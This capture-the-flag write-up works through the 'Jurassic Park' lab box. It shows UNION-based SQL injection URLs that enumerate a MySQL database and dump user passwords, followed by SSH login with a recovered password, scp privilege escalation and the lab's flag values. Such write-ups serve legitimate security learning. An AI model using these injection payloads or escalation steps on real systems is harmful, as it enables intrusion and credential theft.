*Jurassic Park CTF*

So first I took a quick look around the website then started using Gobuster, sqlmap, nmap to try to gather as much info as possible. While looking, I found this page here: 

![image](https://github.com/user-attachments/assets/35f65a92-43a7-4890-a335-10a387bcd877)

As you can see there is this shop. Clicking on the first link in the far left gets you to the link: http://10.10.169.164/item.php?id=3 Which gives the possibility that it is vulnerable to SQL injection.

So after more digging I tried changing the id number in case of an IDOR vulnerability and then I find this: http://10.10.169.164/item.php?id=5 

![image](https://github.com/user-attachments/assets/0874346c-2135-4da5-8b7f-c4f009cc8100)

It shows that there is a page that isn't supposed to be public. It displays an SQL words that get filtered. This is good to know such that we bypass it and get what we need.

Sadly after sometime, sqlmap wasn't able to get the database name. This means we have to do it ourselves. 

For the Gobuster there are few directories that we got: 

![image](https://github.com/user-attachments/assets/83a67ad3-fc98-4ece-9a45-63258e799889)

Assets:

![image](https://github.com/user-attachments/assets/ba407133-283a-44b1-ae3b-4204956480da)

robots.txt: 

![image](https://github.com/user-attachments/assets/af833937-e31e-40cc-9941-e4355ffaedf6)

delete: 

![image](https://github.com/user-attachments/assets/5bce914e-d56c-407e-ae59-99c7cafd6489)

Delete seems intresting giving us a clue that the database is running on MySQL which means to find the database name we can use "Database()" command.

Another thing we now need is to figure out the number of columns. To do this, we can keep adding NULL until it shows an output.

http://10.10.169.164/item.php?id=5%20union%20select%20NULL,Database(),NULL,NULL,NULL

We end up getting an output: 

![image](https://github.com/user-attachments/assets/93b3e42c-b537-4e84-80c8-88a8a81d2ac6)

So we now know that the database name is park and there are 5 columns.

![image](https://github.com/user-attachments/assets/a292fa22-33f2-4446-a791-f212e6f79ff1)

To get the version we can swap Database() with Version(): http://10.10.169.164/item.php?id=5%20union%20select%20NULL,Version(),NULL,NULL,NULL

![image](https://github.com/user-attachments/assets/445a9e17-e187-4d97-854b-13d474f7060b)

Meaning the version is Ubuntu 16.04

![image](https://github.com/user-attachments/assets/b738fb7c-6447-42fd-8a94-609442661a0a)

Now to get the tables in the database we use the following: 10.10.169.164/item.php?id=5 UNION SELECT NULL, group_concat(table_name), NULL, NULL, NULL FROM information_schema.tables WHERE table_schema="park"

Which results in a users and items table: 

![image](https://github.com/user-attachments/assets/2c1212f1-4665-421a-b583-2433dd24a38c)

We now need to know the columns in users that are there so we get: [10.10.169.164/item.php?id=5%20 UNION SELECT NULL, column_name, NULL, NULL, NULL%20 FROM information_schema.columns WHERE table_name="users"](http://10.10.169.164/item.php?id=5%20%20UNION%20SELECT%20NULL,%20group_concat(column_name),%20NULL,%20NULL,%20NULL%20%20FROM%20information_schema.columns%20WHERE%20table_name=%22users%22)

![image](https://github.com/user-attachments/assets/b2f154b5-6ef8-4f37-befc-cb54ffb1a80f)

We get a lot of columns but we are intrested in username and password so lets get them, but hey, there is a filter on the username so we can't use it so we have to only get the passwords which will result in: http://10.10.169.164/item.php?id=5%20UNION%20SELECT%20NULL,NULL,group_concat(id),group_concat(password),NULL%20FROM%20users

![image](https://github.com/user-attachments/assets/70a790a6-6ddf-4ad4-b64e-00e5c1b24d2f)

Possible Passwords: D0nt3ATM3,ih8dinos
But what is the username...
Rememeber in the page there was a clue about the username. Someone called Dennis. But here comes another question. How do we login since there isn't any login page. The answer is from nmap.

![image](https://github.com/user-attachments/assets/8d6645fd-18dc-444f-a39a-79d7471cfec2)

Nmap scan: 

![image](https://github.com/user-attachments/assets/7eda4761-65a5-4b54-8302-5665e598e03f)

We see that there is an SSH port open that we can use. 

Using SSH: ssh dennis@10.10.169.164

![image](https://github.com/user-attachments/assets/2ea3852d-44ba-4b05-a8ec-7b05fb08bda1)

We find the first flag so fast using ls:

![image](https://github.com/user-attachments/assets/3d8c63c7-b91f-4dcb-bf78-1f97d6e3c0f3)

flag1: b89f2d69c56b9981ac92dd267f

When I try to run test.sh I get something about flag5 (foreshadowing?...): 

![image](https://github.com/user-attachments/assets/504eccb7-f4ca-42f2-91a8-c2d39a4d5fea)

After some digging, I used the command "history" and found the third flag: 

![image](https://github.com/user-attachments/assets/a28757a6-0ed8-4eed-8a28-b71e57b9f193)

flag3: b4973bbc9053807856ec815db25fb3f1

In the history there is something about a user called Ben: 

![image](https://github.com/user-attachments/assets/31e74bf6-9a06-4dbb-ae93-9dae6d07c39d)

There is something about SCP and when I did some searching, I found out that I can do privilage escalation: https://gtfobins.github.io/gtfobins/scp/

![image](https://github.com/user-attachments/assets/478f6579-f54b-4c87-95e8-d7d29c1ace2d)

After applying, we are now root!

![image](https://github.com/user-attachments/assets/0998ba51-d344-40ee-88ac-184a295cdefc)

We can now use this command to find where flag5.txt is: find / -name flag5.txt 2> /dev/null

![image](https://github.com/user-attachments/assets/9ce8a12f-caeb-409d-b764-f6a68d7f1ef3)

flag5: 2a7074e491fcacc7eeba97808dc5e2ec

Still have to search for second flag...

I found the second flag after using: cat .viminfo

![image](https://github.com/user-attachments/assets/479df587-c079-43bc-ae47-d01f3e80dcd1)

flag2: 96ccd6b429be8c9a4b501c7a0b117b0a

![image](https://github.com/user-attachments/assets/e91c3dd0-5e8c-4c25-b4fb-73b1ce7e9dfb)

Thank you!
